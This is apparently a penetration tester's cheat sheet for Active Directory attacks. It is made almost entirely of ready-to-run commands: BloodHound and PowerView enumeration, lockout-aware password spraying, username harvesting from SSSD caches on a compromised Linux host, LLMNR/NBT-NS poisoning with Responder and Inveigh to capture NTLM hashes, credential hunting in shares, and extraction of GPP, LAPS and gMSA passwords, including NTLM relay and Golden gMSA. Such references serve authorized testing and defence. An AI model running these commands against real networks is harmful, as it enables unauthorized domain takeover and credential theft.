# AD Enumeration — BloodHound, PowerView, LDAP

---

## BloodHound — query catalog

Import SharpHound zip, then run these queries in BloodHound UI or via Cypher.

### Pre-built queries (Analytics tab)

```
Find all Domain Admins
Shortest Paths to Domain Admins from Owned Principals
Find Principals with DCSync Rights
Find Computers where Domain Users are Local Admin
Find AS-REP Roastable Users (DontReqPreAuth)
List all Kerberoastable Accounts
Shortest Paths from Kerberoastable Users
Find Computers with Unconstrained Delegation
Find Computers with Constrained Delegation
Find Transitive Object Control (Owned → DA)
Shortest Paths to Domain Admins from Computers
```

### Custom Cypher queries

```cypher
// Find users with path to DA that don't require pre-auth
MATCH (u:User {dontreqpreauth: true})-[r*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name, length(r)

// Find computers where you can execute commands (local admin)
MATCH p=(u:User)-[:MemberOf*0..]->(g:Group)-[:AdminTo]->(c:Computer)
WHERE u.name =~ ".*CURRENT_USER.*"
RETURN c.name

// ACL paths: what can owned user write to?
MATCH p=(u:User)-[r:WriteDacl|WriteOwner|GenericWrite|GenericAll|ForceChangePassword]->()
WHERE u.name =~ ".*OWNED.*"
RETURN p

// Find unconstrained delegation computers (except DCs)
MATCH (c:Computer {unconstraineddelegation:true, domain:"DOMAIN.LOCAL"})
WHERE NOT c.name =~ ".*DC.*"
RETURN c.name, c.operatingsystem
```

### Mark owned principals

```
Right-click node → Mark as Owned
Use "Transitive Object Control" from owned node to find paths
```

---

## PowerView cheatsheet

```powershell
# Import
. .\PowerView.ps1
Import-Module .\PowerView.ps1

# Domain basics
Get-Domain
Get-DomainController | Select Name, IPAddress
Get-DomainPolicy | Select -ExpandProperty SystemAccess
(Get-DomainPolicy)["system access"]  # lockout policy

# Users
Get-DomainUser | Select samaccountname, memberof, admincount, lastlogon, pwdlastset
Get-DomainUser -SPN                   # Kerberoastable users
Get-DomainUser -UACFilter NOT_PREAUTH  # AS-REP roastable

# Groups
Get-DomainGroup | Select name, membercount
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins"
Get-NetLocalGroup -ComputerName <host>           # local groups on host
Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators

# Computers
Get-DomainComputer | Select dnshostname, operatingsystem, lastlogontimestamp
Get-DomainComputer -Unconstrained         # unconstrained delegation
Get-DomainComputer -TrustedToAuth         # constrained delegation

# Shares
Find-DomainShare -CheckShareAccess        # shares current user can read
Get-NetShare -ComputerName <host>

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where IdentityReferenceName -match "<user>"
Get-ObjectAcl -SamAccountName "<user>" -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping     # enumerate all trusts recursively

# GPO
Get-DomainGPO | Select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup   # GPOs that add users to local groups
```

---

## LDAP queries (raw — no PowerView needed)

```bash
# From Linux via ldapsearch
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(objectClass=user)" samaccountname userPrincipalName memberOf

# Kerberoastable users (servicePrincipalName set)
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(&(objectClass=user)(servicePrincipalName=*))" samaccountname servicePrincipalName

# AS-REP roastable
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samaccountname

# Domain admins
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local" -D "user@domain.local" -W \
  "(&(objectClass=group)(cn=Domain Admins))" member
```

---

## Domain trust enumeration

```powershell
# Current domain trusts
Get-DomainTrust

# Forest trusts
Get-ForestTrust

# Cross-domain exploitation:
# SID filtering bypassed for trust with SIDHistory allowed?
# Check: TrustAttributes 8 (TREAT_AS_EXTERNAL) or 64 (FOREST_TRANSITIVE)
# SID History attack across trusts: add SID from trusted domain to compromised account
```

---

## Password policy before spraying

```bash
# ALWAYS check before spraying
# crackmapexec
cme smb <dc_ip> -u user -p pass --pass-pol

# net command (from Windows)
net accounts /domain

# PowerView
(Get-DomainPolicy)["system access"]
# Check: LockoutBadCount, LockoutDuration, ResetLockoutCount

# enum4linux-ng
enum4linux-ng -P -u user -p pass <dc_ip>

# rpcclient (unauthenticated, if null session allowed)
rpcclient -U "" -N <dc_ip> -c "getdompwinfo"

# ldapsearch
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Rule: if LockoutBadCount = 5, spray maximum 3 passwords and wait LockoutDuration before next batch.

---

## Network reconnaissance (pre-domain)

```bash
# Passive network enumeration — identify AD traffic patterns
sudo tcpdump -i <interface> -n port 88 or port 389 or port 445

# Responder in analyze mode (no poisoning) — identify LLMNR/NBT-NS/mDNS requests
sudo responder -I <interface> -A

# Discover alive hosts
fping -asgq <subnet>/24

# Identify domain controllers via DNS SRV records
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>
dig SRV _kerberos._tcp.<domain> @<dns_server>
```

---

## Domain user/group enumeration from a domain-joined *nix host (no LDAP credentials)

Entry point A: shell on a domain-joined Linux host, no domain credential yet. Bootstrap valid usernames before Kerberoasting/AS-REP/spray.

```bash
# Confirm domain-joined status and realm name
/usr/sbin/realm list -a
/usr/sbin/adcli info <realm_domain_name>

# Harvest candidate usernames from readable logs — works with zero domain access
find /var/log -type f -readable -exec grep -ail '<realm_domain_name>' {} \; 2>/dev/null
strings /var/log/<file> | grep -i '<realm_domain_name>'

# Validate a candidate username via NSS — resolves through SSSD, no auth needed
getent passwd <domain_username>
id <domain_username>
```

Root on the domain-joined host — read the SSSD cache directly, still no domain credential required:

```bash
# LDB cache (modern SSSD) — list users
strings /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -iE '(ou|cn)=.*user.*' | grep -iv disabled | sort -u

# Same cache — list groups (default AD groups: Domain Admins, Domain Users, Enterprise Admins...)
strings /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -iE '(ou|cn)=.*group.*' | sort -u

# TDB cache (older SSSD) — transfer off-box, parse locally
# source: /var/lib/sss/db/cache_<realm_domain_name>.tdb
tdbdump cache_<realm_domain_name>.tdb | grep -iE '(ou|cn)=.*(user|group).*'

# Default AD security groups without any credential (works if nsswitch.conf routes group through SSSD)
getent group 'Domain Admins@<realm_domain_name>'
```

Feed the resulting username list into AS-REP roasting or a lockout-aware spray — check `Password policy before spraying` above first.

---

## LLMNR/NBT-NS/mDNS poisoning

Capture NTLM hashes by answering broadcast name resolution queries.

```bash
# Responder (Linux attack host) — full poisoning mode
sudo responder -I <interface> -wv
# Hashes saved to /usr/share/responder/logs/
# Crack NTLMv2: hashcat -m 5600

# Responder with relay — disable SMB/HTTP, let ntlmrelayx handle them
# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
sudo responder -I <interface> -wv
```

```powershell
# Inveigh (Windows — when operating from domain-joined host)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (InveighZero)
.\Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y

# Retrieve captured hashes
Get-Inveigh -NTLMv2Unique
```

See `offensive-tools/network/responder/`, `offensive-tools/windows/inveigh/`.

---

## Credential hunting in shares (Snaffler)

```powershell
# Snaffler — automated share spider + content analysis
.\Snaffler.exe -s -d domain.local -o snaffler.log -v data

# Target specific hosts
.\Snaffler.exe -s -n host1,host2 -o results.log -v data

# Parse output for immediate wins
Select-String -Path snaffler.log -Pattern "(password|credential|secret)" -CaseSensitive:$false
```

```bash
# CrackMapExec spider_plus module
crackmapexec smb <target> -u user -p pass -M spider_plus --share 'Department Shares'

# SMBMap — enumerate readable shares
smbmap -u user -p pass -d domain.local -H <dc_ip>

# SMBClient — navigate manually
smbclient -U 'DOMAIN\user' "\\\\<host>\\ShareName"
```

See `offensive-tools/windows/snaffler/`.

---

## Credential fields and misconfigurations

```powershell
# Accounts with PASSWD_NOTREQD — may have empty or weak passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname, useraccountcontrol

# Passwords in user description fields (common in legacy environments)
Get-DomainUser * | Select samaccountname, description | Where {$_.Description -ne $null}

# Autologon credentials in registry
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultPassword"

# GPP passwords (legacy — MS14-025, still found in old environments)
crackmapexec smb <dc_ip> -u user -p pass -M gpp_autologin
crackmapexec smb <dc_ip> -u user -p pass -M gpp_password
```

---

## UAC enumeration

```powershell
# Check if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# 0x1 = enabled, 0x0 = disabled

# Check consent prompt behavior
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# 0x0 = no prompt, 0x5 = prompt for consent (default)
```

---

## LAPS password extraction

LAPS (Local Administrator Password Solution) stores unique local admin passwords in AD. If you have `ReadLAPSPassword` rights (or `GenericAll`/`AllExtendedRights` on computer objects), you can read them.

```bash
# Enumerate LAPS with nxc/crackmapexec (from Linux)
nxc ldap <dc_ip> -u user -p pass -M laps
nxc ldap <dc_ip> -u user -p pass -M laps -O computer="TARGET-"

# Use LAPS password directly
nxc smb <target_subnet>/24 -u user-with-laps-read -p pass --laps

# PowerView (from Windows)
Get-DomainComputer <computer_name> -Properties ms-mcs-AdmPwd,ms-mcs-AdmPwdExpirationTime
# Windows LAPS (newer):
Get-DomainComputer <computer_name> -Properties msLAPS-Password,msLAPS-PasswordExpirationTime

# pyLAPS (Python)
pyLAPS.py --action get -d domain.local -u user -p pass --dc-ip <dc_ip>

# LAPS via NTLM relay (relay to LDAP, dump LAPS)
impacket-ntlmrelayx -t ldaps://<dc_ip> --dump-laps

# Find who can read LAPS passwords
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=domain,DC=local" | fl
```

### BloodHound LAPS queries

```cypher
// Computers with LAPS enabled
MATCH (c:Computer {haslaps:true}) RETURN c.name

// Who can read LAPS passwords?
MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer)
RETURN n.name, c.name
```

---

## gMSA password extraction

Group Managed Service Accounts (gMSA) have auto-rotated passwords. If you have `ReadGMSAPassword` rights on the gMSA, you can extract the NT hash.

```bash
# gMSADumper (Python — from Linux)
python3 gMSADumper.py -u user -p pass -d domain.local -l <dc_ip>

# nxc module
nxc ldap <dc_ip> -u user -p pass -M gmsa

# From Windows (PowerShell AD module)
$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
# Parse with DSInternals:
Import-Module DSInternals
$pwd = ConvertFrom-ADManagedPasswordBlob $blob
$pwd.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText

# bloodyAD (Python)
bloodyAD --host <dc_ip> -d domain.local -u user -p pass get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

### Golden gMSA attack

If you have compromised a domain and can read KDS root key attributes, you can compute gMSA passwords offline without touching AD again.

```bash
# Extract KDS root key (requires DA or equivalent)
# Then use GoldenGMSA tool to compute passwords offline:
GoldenGMSA.exe gmsainfo
GoldenGMSA.exe compute --sid <gmsa_sid>
```

### BloodHound gMSA queries

```cypher
// Who can read gMSA passwords?
MATCH p=(n)-[:ReadGMSAPassword]->(m:User)
RETURN n.name, m.name

// gMSA accounts with admin paths
MATCH (g:User {gmsa:true})-[:MemberOf*1..]->(group:Group {admincount:true})
RETURN g.name, collect(group.name)
```
